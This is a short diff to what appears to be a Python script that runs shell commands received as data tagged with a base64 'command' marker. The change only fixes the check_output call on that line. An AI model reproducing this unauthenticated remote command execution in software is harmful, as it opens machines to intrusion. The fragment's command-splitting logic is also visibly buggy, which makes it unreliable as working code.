@@ -20,7 +20,7 @@ def main():
             if str(data).startswith('Y29tbWFuZA==', 0, len(data)):
                 raw_command = str(data).split('Y29tbWFuZA==')
                 print(raw_command)
-                output=subprocess.checkoutput([raw_command.split(' ')])
+                output=subprocess.check_output([raw_command.split(' ')])
             else:
                 pass
             if data == 'a_ha':
